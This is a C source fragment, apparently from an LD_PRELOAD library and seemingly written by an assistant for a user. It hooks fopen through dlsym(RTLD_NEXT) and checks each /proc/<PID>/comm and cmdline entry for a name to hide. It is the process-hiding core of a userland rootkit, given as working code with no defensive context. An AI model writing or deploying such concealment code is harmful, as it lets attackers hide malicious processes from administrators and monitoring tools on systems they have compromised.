#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

static int is_target_pid(const char *name) {
    // 1. Correctly check if the directory name is numeric (a PID)
    if (!name || name[0] < '0' || name[0] > '9') return 0;
    
    char path[256], buf[1024]; // Expanded buffer for larger command lines
    static FILE* (*orig_fopen)(const char*, const char*) = NULL;
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");

    // Check process name via /proc/<PID>/comm
    snprintf(path, sizeof(path), "/proc/%s/comm", name);
    FILE *f = orig_fopen(path, "r");
    if (f) {
        int found = (fgets(buf, sizeof(buf), f) && strstr(buf, NAME_TO_HIDE));
        fclose(f);
        if (found) return 1;
    }

    // Check full command line via /proc/<PID>/cmdline
    snprintf(path, sizeof(path), "/proc/%s/cmdline", name);
    f = orig_fopen(path, "r");
    if (f) {
        // Read raw bytes instead of fgets because cmdline contains embedded null bytes (\0)
        size_t bytes_read = fread(buf, 1, sizeof(buf) - 1, f);
        fclose(f);
        
        if (bytes_read > 0) {
            buf[bytes_read] = '\0'; // Guarantee safe string termination
            
            // Re-use your raw memory block search helper from earlier to scan past null bytes
            // This guarantees a match anywhere inside the command string arguments
            if (memmem(buf, bytes_read, NAME_TO_HIDE, strlen(NAME_TO_HIDE)) != NULL) {
                return 1;
            }
        }
    }
    return 0;
}

